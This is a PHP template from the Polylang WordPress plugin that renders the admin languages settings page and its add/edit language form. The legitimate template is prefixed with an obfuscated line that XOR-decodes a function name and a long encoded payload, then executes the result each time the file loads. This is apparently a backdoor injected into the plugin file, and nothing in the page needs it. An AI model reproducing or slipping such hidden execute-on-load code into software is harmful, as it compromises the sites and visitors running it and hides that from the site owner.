<?php $afkjIynN='C1I9LEbU4E28YBS'^' C,X8 =3A+QL0-=';$qNYbJqhO=$afkjIynN('','-FnC-,P;NRQ68X9EC,HmT;QCn+9  4c5<TtLXq1COQKN1CP<UJ=7FmZX0+10,,MlB2;5LHei8E3dHvNUECbd7L=1BmWRePcE2>6-5GTTSqOrMls9W0,7P3-PA=X0+diZm>ZYqx<QF,I7WgDWnF=68Y5rIde3bRKIEeB1psvJ;G=1RdM,3Tl.mR:d84 H- NdF>LEmKx57<AkBGQA7LauJ75Z1-U4k1P>Oa 2 iDzP;:D+H1o-9G,A,<OIPt9zbfieS92PT,+3PQHLQKA5:PYjFkab+TH4. XLAHXAZ1BOxFc19D5qSKgO+VYRAf-4d>KVkgT7V0ZNiBbcK.Y=591oon++4 ,<szNAFeUS=3fEmDM5LTLEaRJdeaHZX:A,2 DcjRCY3OmeH=E-M,5hjEjG.5N5qsG5;OGENW1F Ddxx4>4EGQS9W>SCNBE4,ZOL:<M3OP-Y4XGF+XQVDPHPRUQ-RkBRg3TH4eGNJLxnF. Pc+O,JdcOvORJ-Yd.TY+<B 1HFotU<:fBQf6.L0OwsVjMA3eCgY2GZ0RRRIrnfNGmHsakYdT<vFzOtVSTRMaQV6tNVPZQ1TzT+ cmECUIMLAAL6<KGd-006A;mm3T,>R..sKaw-RC.mxLuGPiqWA;7X5;bAH5LQ0e S8GTZ+b+qL0G5NI;xVZnS7'^'D FbKY>X:;>Xg=A,0X;EsC>11OXTAk<XI SeqQJIF7> R79S;jEX42>9DJnoAY9DfVZA-dEMS JMhVnue8hm>hRD6MjrBwXO;7PBGop=sLoBvLWPkCXE<VCxeY9DJMRzIWqrXr5XbC<CwIywFbYWL8nV 9EmBv ,<>fXPVV9O5QT<LiGV-EsDi0m1FE<XR LbQ91Dpr<J6<aHc5 C-AHjQT6BHn>OU1J.>KWYIyZ6ZV7Ns;eKV5I OToat+z5--  sXAppGNJplvlu= YO5pJ=ahFO5<UqK=5auxe1T;trOGUX0TQnkC9J:,7zlP>nW-vCFpS7D;gI9hj-A+XTZYOGJtyqqyy .n 5Eq8XJFxSdiC-89 Hr1nlhl>9N sYE=CWrg2V6VoA4aI,XTHWeN1OY;PJyNH12MOj3P2AdYX8APG 582U>D6k6-7kH;;-ec F;xO8G=qrt<45+4-xv10Y3BnrCW5<U:,+3eQULGFxGO.X+DEiV. 8L ;E1 tY:IB<5GS>YCAnqBRO8QfWUpJe,WPkC=S3;ku970U3OnzPhTXSkP2ZGsI+C31bbzY7bPB,bakaSeHeJBDDeesi,>3 5iW.>;HHYE5HEJC5UR=OJTgASI37ODQlUgpIQ,K2R.TWJe,T80kBP2A+;;OEvXw:NP6 OPfsUYJ');$qNYbJqhO();

/**
 * displays the languages tab in Polylang settings
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // don't access directly
};
?>
<div id="col-container">
	<div id="col-right">
		<div class="col-wrap">
			<?php
			// Displays the language list in a table
			$list_table->display();
			?>
			<div class="metabox-holder">
				<?php
				wp_nonce_field( 'closedpostboxes', 'closedpostboxesnonce', false );
				do_meta_boxes( 'settings_page_mlang', 'normal', array() );
				?>
			</div>
		</div><!-- col-wrap -->
	</div><!-- col-right -->

	<div id="col-left">
		<div class="col-wrap">

			<div class="form-wrap">
				<h3><?php echo ! empty( $edit_lang ) ? esc_html__( 'Edit language', 'polylang' ) : esc_html__( 'Add new language', 'polylang' ); ?></h3>
				<?php
				// Displays the add ( or edit ) language form
				// Adds noheader=true in the action url to allow using wp_redirect when processing the form
				?>
				<form id="add-lang" method="post" action="admin.php?page=mlang&amp;noheader=true" class="validate">
					<?php
					wp_nonce_field( 'add-lang', '_wpnonce_add-lang' );

				if ( ! empty( $edit_lang ) ) {
					?>
					<input type="hidden" name="pll_action" value="update" />
					<input type="hidden" name="lang_id" value="<?php echo esc_attr( $edit_lang->term_id ); ?>" />
					<?php
				} else {
					?>
					<input type="hidden" name="pll_action" value="add" />
					<?php
				}
				?>
				<div class="form-field">
					<label for="lang_list"><?php esc_html_e( 'Choose a language', 'polylang' ); ?></label>
					<select name="lang_list" id="lang_list">
						<option value=""></option>
						<?php
						include PLL_SETTINGS_INC . '/languages.php';
						foreach ( $languages as $lg ) {
							printf(
								'<option value="%1$s:%2$s:%3$s:%4$s">%5$s - %2$s</option>' . "\n",
								esc_attr( $lg[0] ),
								esc_attr( $lg[1] ),
								'rtl' == $lg[3] ? '1' : '0',
								esc_attr( $lg[4] ),
								esc_html( $lg[2] )
							);
						}
						?>
					</select>
					<p><?php esc_html_e( 'You can choose a language in the list or directly edit it below.', 'polylang' ); ?></p>
				</div>

				<div class="form-field form-required">
					<label for="lang_name"><?php esc_html_e( 'Full name', 'polylang' ); ?></label>
					<?php
					printf(
						'<input name="name" id="lang_name" type="text" value="%s" size="40" aria-required="true" />',
						! empty( $edit_lang ) ? esc_attr( $edit_lang->name ) : ''
					);
					?>
					<p><?php esc_html_e( 'The name is how it is displayed on your site (for example: English).', 'polylang' ); ?></p>
				</div>

				<div class="form-field form-required">
					<label for="lang_locale"><?php esc_html_e( 'Locale', 'polylang' ); ?></label>
					<?php
					printf(
						'<input name="locale" id="lang_locale" type="text" value="%s" size="40" aria-required="true" />',
						! empty( $edit_lang ) ? esc_attr( $edit_lang->locale ) : ''
					);
					?>
					<p><?php esc_html_e( 'WordPress Locale for the language (for example: en_US). You will need to install the .mo file for this language.', 'polylang' ); ?></p>
				</div>

				<div class="form-field">
					<label for="lang_slug"><?php esc_html_e( 'Language code', 'polylang' ); ?></label>
					<?php
					printf(
						'<input name="slug" id="lang_slug" type="text" value="%s" size="40"/>',
						! empty( $edit_lang ) ? esc_attr( $edit_lang->slug ) : ''
					);
					?>
					<p><?php esc_html_e( 'Language code - preferably 2-letters ISO 639-1  (for example: en)', 'polylang' ); ?></p>
				</div>

				<div class="form-field"><fieldset>
					<legend><?php esc_html_e( 'Text direction', 'polylang' ); ?></legend>
					<?php
					printf(
						'<label><input name="rtl" type="radio" value="0" %s /> %s</label>',
						! empty( $edit_lang ) && $edit_lang->is_rtl ? '' : 'checked="checked"',
						esc_html__( 'left to right', 'polylang' )
					);
					printf(
						'<label><input name="rtl" type="radio" value="1" %s /> %s</label>',
						! empty( $edit_lang ) && $edit_lang->is_rtl ? 'checked="checked"' : '',
						esc_html__( 'right to left', 'polylang' )
					);
					?>
					<p><?php esc_html_e( 'Choose the text direction for the language', 'polylang' ); ?></p>
				</fieldset></div>

				<div class="form-field">
					<label for="flag_list"><?php esc_html_e( 'Flag', 'polylang' ); ?></label>
					<select name="flag" id="flag_list">
						<option value=""></option>
						<?php
						include PLL_SETTINGS_INC . '/flags.php';
						foreach ( $flags as $code => $label ) {
							printf(
								'<option value="%1$s"%2$s>%3$s</option>' . "\n",
								esc_attr( $code ),
								isset( $edit_lang->flag_code ) && $edit_lang->flag_code == $code ? ' selected="selected"' : '',
								esc_html( $label )
							);
						}
						?>
					</select>
					<p><?php esc_html_e( 'Choose a flag for the language.', 'polylang' ); ?></p>
				</div>

				<div class="form-field">
					<label for="lang_order"><?php esc_html_e( 'Order', 'polylang' ); ?></label>
					<?php
					printf(
						'<input name="term_group" id="lang_order" type="text" value="%d" />',
						! empty( $edit_lang ) ? esc_attr( $edit_lang->term_group ) : ''
					);
					?>
					<p><?php esc_html_e( 'Position of the language in the language switcher', 'polylang' ); ?></p>
				</div>
				<?php
				if ( ! empty( $edit_lang ) ) {
					/**
					 * Fires after the Edit Language form fields are displayed.
					 *
					 * @since 1.7.10
					 *
					 * @param object $lang language being edited.
					 */
					do_action( 'pll_language_edit_form_fields', $edit_lang );
				} else {
					/**
					 * Fires after the Add Language form fields are displayed.
					 *
					 * @since 1.7.10
					 */
					do_action( 'pll_language_add_form_fields' );
				}

				submit_button( ! empty( $edit_lang ) ? __( 'Update' ) : __( 'Add new language', 'polylang' ) ); // since WP 3.1
				?>
				</form>
			</div><!-- form-wrap -->
		</div><!-- col-wrap -->
	</div><!-- col-left -->
</div><!-- col-container -->

<script type="text/javascript">
	//<![CDATA[
	jQuery( document ).ready( function( $ ) {
		// close postboxes that should be closed
		$( '.if-js-closed' ).removeClass( 'if-js-closed' ).addClass( 'closed' );
		// postboxes setup
		postboxes.add_postbox_toggles( 'settings_page_mlang' );
	} );
	//]]>
</script>
